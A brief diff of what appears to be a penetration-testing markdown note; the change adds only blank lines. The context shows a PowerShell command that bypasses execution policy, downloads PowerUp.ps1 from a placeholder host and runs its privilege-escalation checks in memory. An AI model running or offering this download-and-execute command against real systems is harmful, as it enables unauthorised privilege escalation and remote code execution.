@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:34.119569+00:00'
 ```bash
 powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
 ```
+
+
